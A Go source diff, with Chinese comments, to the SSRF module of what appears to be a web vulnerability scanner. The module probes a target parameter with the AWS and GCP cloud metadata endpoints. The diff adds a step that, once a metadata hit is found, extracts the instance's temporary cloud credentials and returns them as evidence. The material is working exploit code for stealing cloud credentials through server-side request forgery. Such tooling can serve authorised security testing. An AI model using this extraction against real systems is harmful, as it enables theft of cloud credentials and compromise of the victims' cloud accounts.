@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"net/http"
+	"strings"
 	"time"
 )
 
@@ -89,6 +90,7 @@ func RunSSRF(ctx context.Context, client *http.Client, targetURL, param, token s
 		{"meta_aws", "http://169.254.169.254/latest/meta-data/", []string{"ami-", "instance-id", "iam/security-credentials"}},
 		{"meta_gcp", "http://metadata.google.internal/computeMetadata/v1/", []string{"computeMetadata", "instance"}},
 	}
+	var creds []CloudCredentials
 	for _, mp := range metaProbes {
 		for _, u := range probeURLs(targetURL, param, []string{mp.value}) {
 			body, _, _, err := probeGet(ctx, client, u)
@@ -101,7 +103,14 @@ func RunSSRF(ctx context.Context, client *http.Client, targetURL, param, token s
 				),
 			})
 			if hit {
-				return joinProbes("ssrf", token, probes, "云元数据命中：按云凭据泄露路径评估影响。")
+				// 云元数据凭据深取（v0.4.93 能力域 #11）：提取临时凭据作为强证据。
+				creds = ProbeCloudMeta(ctx, client, mp.value, mapName(mp.name))
+				if len(creds) > 0 {
+					r := joinProbes("ssrf", token, probes, "云元数据命中且提取到凭据（见 credentials 字段）。")
+					r.Credentials = creds
+					return r
+				}
+				return joinProbes("ssrf", token, probes, "云元数据命中：按云凭据泄露路径评估影响（凭据深取未成功，可手动跑完整 SSRF 载荷）。")
 			}
 		}
 	}
@@ -110,6 +119,14 @@ func RunSSRF(ctx context.Context, client *http.Client, targetURL, param, token s
 		note = oob.Note
 	}
 	return joinProbes("ssrf", token, probes, note)
+}
+
+// mapName 把探针名映射到云厂商（凭据深取入口用）。
+func mapName(probeName string) string {
+	if strings.HasPrefix(probeName, "meta_gcp") {
+		return "gcp"
+	}
+	return "aws"
 }
 
 // containsAny 判断响应是否含任一强特征。
